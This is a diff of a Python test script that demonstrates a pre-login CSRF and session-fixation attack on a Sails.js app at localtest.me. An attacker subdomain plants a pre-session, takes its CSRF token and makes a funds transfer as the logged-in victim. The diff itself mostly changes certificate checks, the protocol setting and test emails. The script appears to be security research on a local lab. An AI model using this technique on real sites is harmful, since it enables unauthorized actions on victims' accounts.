@@ -1,12 +1,17 @@
 import requests
 from bs4 import BeautifulSoup
 import random
+import os
 
 import http.client
 http.client._MAXHEADERS = 1000
 
-TARGET = 'http://localtest.me/'
-ATTACKER = 'http://attack.localtest.me/'
+try:
+    PROTOCOL = os.environ['PROTOCOL']
+except:
+    PROTOCOL = 'http'
+TARGET = f'{PROTOCOL}://localtest.me/'
+ATTACKER = f'{PROTOCOL}://attack.localtest.me/'
 PRIVATE_KEY = './server/localtest.me.crt'
 
 USER1 = random.randint(10000, 99999)
@@ -29,11 +34,11 @@ def get_csrf_token_sails(page):
     return page.split("window.SAILS_LOCALS = { _csrf: unescape('")[1].split("'")[0]
 
 def signup_sails(id, password = PASSWORD):
-    r = s.get(TARGET + 'signup')
+    r = s.get(TARGET + 'signup', verify = PRIVATE_KEY)
     assert 'Please enter your full name.' in r.text
 
     csrf_token = get_csrf_token_sails(r.text)
-    data = {'_csrf' : csrf_token, "fullName" : id , "emailAddress" : f"{id}@a.com", "password" : password, "confirmPassword" : PASSWORD, "agreed" : True}
+    data = {'_csrf' : csrf_token, "fullName" : id , "emailAddress" : f"{id}@test.com", "password" : password, "confirmPassword" : PASSWORD, "agreed" : True}
     r = s.post(TARGET + 'api/v1/entrance/signup', data = data)
     assert 'OK' or 'Conflict' in r.text
     
@@ -43,11 +48,11 @@ def signup_sails(id, password = PASSWORD):
     return r
 
 def login_sails(id, password = PASSWORD):
-    r = s.get(TARGET + 'login', verify = False)
+    r = s.get(TARGET + 'login', verify = PRIVATE_KEY)
     assert 'Sign in to your account' in r.text
 
     csrf_token = get_csrf_token_sails(r.text)
-    data = {'_csrf' : csrf_token, "emailAddress" : f"{id}@a.com", "password" : password, 'rememberMe': 0}
+    data = {'_csrf' : csrf_token, "emailAddress" : f"{id}@test.com", "password" : password, 'rememberMe': 0}
     r = s.put(TARGET + 'api/v1/entrance/login', data = data)
     assert 'OK' in r.text
 
@@ -89,7 +94,7 @@ with requests.Session() as s:
     print("[+] Testing login")
 
     ### Access main page
-    r = s.get(TARGET, verify = False)
+    r = s.get(TARGET, verify = PRIVATE_KEY)
     assert LOGOUT_MESSAGE in r.text
 
     ### Fail to perform CSRF protected operation
@@ -105,10 +110,10 @@ with requests.Session() as s:
     csrf_token = get_csrf_token(r.text)
 
     r = transfer_sails('attacker', ammount1, csrf_token)
-    assert f"Successfull transferred {ammount1} from {USER1} to attacker" in r.text
+    assert f"Successfully transferred {ammount1} from {USER1} to attacker" in r.text
     current_balance -= ammount1
 
-    r = s.get(TARGET, verify = False)
+    r = s.get(TARGET)
     assert f'Welcome {USER1}.' in r.text
     assert str(current_balance) in r.text
 
@@ -121,7 +126,7 @@ with requests.Session() as s:
 with requests.Session() as s:
     print("[+] Trying pre-login without fixation")
 
-    r_target = s.get(TARGET, verify = False)
+    r_target = s.get(TARGET, verify = PRIVATE_KEY)
     assert LOGOUT_MESSAGE in r_target.text
 
     ### TARGET LOGIN
@@ -130,7 +135,7 @@ with requests.Session() as s:
 
     ### ATTACKER tries performing CSRF protected operation on behalf uf USER1 WITHOUT pre-fixating the secret
     ### Attacker (wrongly) Setting Pre-Session
-    s.get(ATTACKER, verify = False)
+    s.get(ATTACKER, verify = PRIVATE_KEY)
     r_attacker = s.get(ATTACKER + 'set_pre_session')
     ### extract csrf token to use later
     csrf_token_attacker = get_csrf_token(r_attacker.text)
@@ -150,7 +155,7 @@ with requests.Session() as s:
     print("[+] Testing pre-login CSRF attack")
 
     ### Attacker Setting Pre-Session
-    s.get(ATTACKER, verify = False)
+    s.get(ATTACKER, verify = PRIVATE_KEY)
     r_attacker = s.get(ATTACKER + 'set_pre_session')
     ### extract csrf token to use later
     csrf_token_attacker = get_csrf_token(r_attacker.text)
@@ -163,10 +168,10 @@ with requests.Session() as s:
     ### ATTACKER Succeeds in performing CSRF protected operation on behalf of USER1
     r_attacker = transfer_sails('attacker', ammount2, csrf_token_attacker)
 
-    assert f"Successfull transferred {ammount2} from {USER1} to attacker" in r_attacker.text, " NOT VULNERABLE to pre-login CSRF attack"
+    assert f"Successfully transferred {ammount2} from {USER1} to attacker" in r_attacker.text, " NOT VULNERABLE to pre-login CSRF attack"
     current_balance -= ammount2
 
-    r = s.get(TARGET, verify = False)
+    r = s.get(TARGET, verify = PRIVATE_KEY)
     assert f'Welcome {USER1}.' in r.text
     assert str(current_balance) in r.text
 
